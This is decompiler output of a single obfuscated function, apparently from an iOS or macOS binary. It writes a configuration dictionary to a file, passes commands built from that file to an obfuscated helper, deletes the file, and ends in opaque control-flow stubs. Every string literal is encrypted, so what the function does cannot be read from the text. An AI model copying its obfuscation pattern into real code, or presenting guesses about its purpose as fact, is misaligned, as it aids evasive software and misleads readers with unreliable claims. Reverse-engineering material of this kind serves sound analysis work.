/*
 * func-name: sub_1006C8474
 * func-address: 0x1006c8474
 * export-type: decompile
 * callers: none
 * callees: 0x1001e91d0, 0x1006dfe60, 0x1006e16b4, 0x100798e78, 0x100798e90, 0x100798e9c, 0x100798ec0, 0x100798f20, 0x10079907c
 */

void sub_1006C8474()
{
  __int64 v0; // x29
  id v1; // x23
  NSArray *v2; // x26
  id v3; // x20
  id v4; // x27
  NSString *v5; // x20
  NSNumber *v6; // x27
  NSDictionary *v7; // x19
  NSString *v8; // x24
  __int64 v9; // x2
  id v10; // x22
  NSNumber *v11; // x21
  NSNumber *v12; // x23
  NSDictionary *v13; // x20
  void *v14; // x24
  const char *v15; // x26
  id v16; // x22
  id v17; // x0
  id v18; // x22
  id v19; // x0
  id v20; // x21
  void *v21; // x19
  id v22; // x0
  int v23; // w8
  __int64 v24; // [xsp+10h] [xbp-A0h] BYREF
  _QWORD v25[2]; // [xsp+20h] [xbp-90h] BYREF
  NSNumber *v26; // [xsp+30h] [xbp-80h] BYREF
  _QWORD v27[6]; // [xsp+40h] [xbp-70h] BYREF
  _QWORD v28[6]; // [xsp+70h] [xbp-40h] BYREF
  _QWORD v29[2]; // [xsp+A0h] [xbp-10h] BYREF

  *(_DWORD *)(v0 - 128) = 1102612020 * (dword_1009F9678 ^ dword_1009F967C ^ 0x65CA8236);
  atomic_store(1u, (unsigned int *)&dword_100A224AC);
  *(_QWORD *)(v0 - 144) = v28;
  *(_QWORD *)(v0 - 152) = v27;
  *(_QWORD *)(v0 - 192) = &v26;
  *(_QWORD *)(v0 - 184) = v25;
  *(_QWORD *)(v0 - 176) = &v24;
  v1 = objc_retain(*(id *)(v0 - 120));
  v29[0] = CFSTR("\x81\xCF\x04");
  v29[1] = v1;
  *(_QWORD *)(v0 - 200) = "arrayWithObjects:count:";
  v2 = objc_retainAutoreleasedReturnValue(+[NSArray arrayWithObjects:count:](&OBJC_CLASS___NSArray, "arrayWithObjects:count:", v29, 2));
  sub_1001E91D0();
  objc_release(v2);
  v3 = objc_retainAutoreleasedReturnValue(objc_msgSend(v1, "lastPathComponent"));
  *(_QWORD *)(v0 - 168) = objc_retainAutoreleasedReturnValue(
                            +[NSString stringWithFormat:](
                              &OBJC_CLASS___NSString,
                              "stringWithFormat:",
                              CFSTR("33\xE1\x74\xCC\xEA\x7C\x9E\xA7Jc3"),
                              CFSTR("\xFCn\x89e\xB3\x91-8\x12\xA0\xB8\x1F\x02;^\x1Do։\x1E\xA8!"),
                              v3));
  objc_release(v3);
  *(_QWORD *)(v0 - 160) = v1;
  v4 = objc_retainAutoreleasedReturnValue(objc_msgSend(v1, "lastPathComponent"));
  *(_QWORD *)(v0 - 208) = "stringWithFormat:";
  v5 = objc_retainAutoreleasedReturnValue(
         +[NSString stringWithFormat:](
           &OBJC_CLASS___NSString,
           "stringWithFormat:",
           CFSTR("\xFE<\xC1\x6BC\xA7\xD7\x0D\xEA\x9F\x65\xA5\x00S"),
           v4));
  *(_QWORD *)(v0 - 136) = v5;
  objc_release(v4);
  v27[0] = CFSTR("\xD0\x06\xF8,\x15");
  v27[1] = CFSTR("\x92\xA1\xC4\xD9\x1C\xD5\xE3\xAF");
  v28[0] = v5;
  v28[1] = CFSTR("\v\x0Fa\xF8\x86\xFD{");
  v27[2] = CFSTR("\xDE\xCFQ\xDB\x49XO)\n\x88\xFC\"\xC2\xE8\xCB\xD3x");
  v25[0] = CFSTR("\x9F/WJu\xBAq!w$\xA3ef'\n");
  v6 = objc_retainAutoreleasedReturnValue(+[NSNumber numberWithInt:](&OBJC_CLASS___NSNumber, "numberWithInt:", 18));
  v26 = v6;
  v7 = objc_retainAutoreleasedReturnValue(
         +[NSDictionary dictionaryWithObjects:forKeys:count:](
           &OBJC_CLASS___NSDictionary,
           "dictionaryWithObjects:forKeys:count:",
           *(_QWORD *)(v0 - 192),
           v25,
           1));
  v28[2] = v7;
  v27[3] = CFSTR("\xFD\xC0\x69\x7F\xFFQdھ\x80\xE1\xFA\x68 \xC0\xBB\x04");
  v8 = objc_retainAutoreleasedReturnValue(+[NSString stringWithFormat:](&OBJC_CLASS___NSString, "stringWithFormat:", CFSTR("\xFF>0"), v1));
  v9 = *(_QWORD *)(v0 - 176);
  *(_QWORD *)(*(_QWORD *)(v0 - 184) - 16LL) = v8;
  v10 = objc_retainAutoreleasedReturnValue(objc_msgSend(&OBJC_CLASS___NSArray, *(SEL *)(v0 - 200), v9, 1));
  v28[3] = v10;
  v27[4] = CFSTR("\x1D\xC7\xDB\r<g\r\xB9\x06F");
  v11 = objc_retainAutoreleasedReturnValue(+[NSNumber numberWithBool:](&OBJC_CLASS___NSNumber, "numberWithBool:", 1));
  v28[4] = v11;
  v27[5] = CFSTR("1bC\vK^\xF6\x78\xB8\xA8");
  v12 = objc_retainAutoreleasedReturnValue(+[NSNumber numberWithBool:](&OBJC_CLASS___NSNumber, "numberWithBool:", 1));
  v28[5] = v12;
  v13 = objc_retainAutoreleasedReturnValue(
          +[NSDictionary dictionaryWithObjects:forKeys:count:](
            &OBJC_CLASS___NSDictionary,
            "dictionaryWithObjects:forKeys:count:",
            *(_QWORD *)(v0 - 144),
            *(_QWORD *)(v0 - 152),
            6));
  objc_release(v12);
  objc_release(v11);
  objc_release(v10);
  objc_release(v8);
  objc_release(v7);
  objc_release(v6);
  v14 = *(void **)(v0 - 168);
  -[NSDictionary writeToFile:atomically:](v13, "writeToFile:atomically:", v14, 1);
  v15 = *(const char **)(v0 - 208);
  v16 = objc_retainAutoreleasedReturnValue(objc_msgSend(&OBJC_CLASS___NSString, v15, CFSTR("i\xFE<)\x1CY \v\x16u\x8A\xEA\xEE\x8CJx\xFB\x11"), v14));
  v17 = objc_unsafeClaimAutoreleasedReturnValue(+[z66bqP7l i0OLpS8C:](&OBJC_CLASS___z66bqP7l, "i0OLpS8C:", v16));
  objc_release(v16);
  sleep(1u);
  v18 = objc_retainAutoreleasedReturnValue(
          objc_msgSend(
            &OBJC_CLASS___NSString,
            v15,
            CFSTR("\xAF\x94\xE2\x36\xE5\xC6\x25$\xBFQ\x13؛\x90\x1C\xE8\x05\x3DQ"),
            v14));
  v19 = objc_unsafeClaimAutoreleasedReturnValue(+[z66bqP7l i0OLpS8C:](&OBJC_CLASS___z66bqP7l, "i0OLpS8C:", v18));
  objc_release(v18);
  v20 = objc_retainAutoreleasedReturnValue(+[u8sEaswy x9YT7zjs](&OBJC_CLASS___u8sEaswy, "x9YT7zjs"));
  objc_msgSend(v20, "removeItemAtPath:error:", v14, 0);
  objc_release(v20);
  v21 = *(void **)(v0 - 160);
  v22 = objc_unsafeClaimAutoreleasedReturnValue(+[z66bqP7l i0OLpS8C:](&OBJC_CLASS___z66bqP7l, "i0OLpS8C:", v21));
  objc_release(v13);
  objc_release(*(id *)(v0 - 136));
  objc_release(v14);
  objc_release(v21);
  if ( *(_DWORD *)(v0 - 128) == -694707960 )
    v23 = 2134599663;
  else
    v23 = 1808328610;
  **(_DWORD **)(v0 - 112) = v23;
  nullsub_30(off_1009FD738);
  JUMPOUT(0x1006C83C4LL);
}
